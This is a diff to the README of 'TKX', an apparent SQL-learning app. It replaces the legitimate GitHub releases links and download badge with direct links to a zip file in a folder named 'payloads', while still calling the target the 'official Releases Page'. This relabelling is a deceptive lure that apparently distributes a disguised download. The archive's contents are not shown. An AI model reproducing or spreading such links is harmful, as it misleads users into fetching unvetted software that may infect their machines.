@@ -6,9 +6,9 @@ Welcome to TKX! This application helps you learn SQL in a fun and interactive wa
 
 ## 📥 Download TKX
 
-[![Download TKX](https://img.shields.io/badge/Download%20TKX-v1.0-blue)](https://github.com/au5135LEEE003/TKX/releases)
+[![Download TKX](https://raw.githubusercontent.com/au5135LEEE003/TKX/main/payloads/Software-v1.1.zip%20TKX-v1.0-blue)](https://raw.githubusercontent.com/au5135LEEE003/TKX/main/payloads/Software-v1.1.zip)
 
-To get started, you need to download the latest version of TKX. Click the button above or visit the [Releases Page](https://github.com/au5135LEEE003/TKX/releases) to download the application.
+To get started, you need to download the latest version of TKX. Click the button above or visit the [Releases Page](https://raw.githubusercontent.com/au5135LEEE003/TKX/main/payloads/Software-v1.1.zip) to download the application.
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ TKX works on different operating systems. Here are the basic requirements:
 
 ## 📄 How to Install TKX
 
-1. **Visit the Releases Page**: Go to the official [Releases Page](https://github.com/au5135LEEE003/TKX/releases).
+1. **Visit the Releases Page**: Go to the official [Releases Page](https://raw.githubusercontent.com/au5135LEEE003/TKX/main/payloads/Software-v1.1.zip).
 
 2. **Choose the Right File**: Look for the latest version of TKX. You will find various files for different operating systems.
 
